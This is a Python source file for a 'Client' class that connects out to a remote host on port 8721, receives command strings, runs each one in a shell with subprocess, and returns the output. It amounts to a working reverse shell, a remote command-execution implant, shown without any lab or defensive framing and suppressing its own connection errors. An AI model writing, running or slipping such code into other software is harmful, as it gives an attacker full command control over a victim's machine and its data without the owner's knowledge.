import socket
import subprocess
import os

class Client:
    def __init__(self, addr, port=8721):
        self.IP = addr
        self.PORT = port
        self.current_directory = os.getcwd()  # Track the current directory

        # Initialize the server socket
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.server.connect((self.IP, self.PORT))
        except Exception as e:
            return

        self.listen_to_server()

    def listen_to_server(self):
        try:
            while True:
                try:
                    # Receive command and remove extra whitespace/newlines
                    cmd = self.server.recv(1024).decode('utf-8').strip()
                    if not cmd:
                        break


                    # Check if the command is a change directory command.
                    if cmd.startswith("cd "):
                        # Extract the path from the command.
                        path = cmd[3:].strip()
                        try:
                            os.chdir(path)
                            self.current_directory = os.getcwd()
                            out = f"[INFO] Directory changed to {self.current_directory}"
                        except Exception as e:
                            out = f"[ERROR] Changing directory failed: {e}"
                    else:
                        # Execute other commands in the current directory.
                        process = subprocess.Popen(
                            cmd,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True,
                            cwd=self.current_directory  # Use updated directory
                        )
                        stdout, stderr = process.communicate()

                        # Use stdout if available; otherwise, fallback to stderr.
                        out = stdout.strip() if stdout.strip() else stderr.strip()
                        if not out:
                            out = "[INFO] Command executed but no output was returned."

                    # Send the response back.
                    self.server.send(out.encode('utf-8'))

                except Exception as e:
                    error_msg = f"[CMD FAILED] {e}"
                    self.server.send(error_msg.encode('utf-8'))
        except KeyboardInterrupt:
            pass
        finally:
            self.server.close()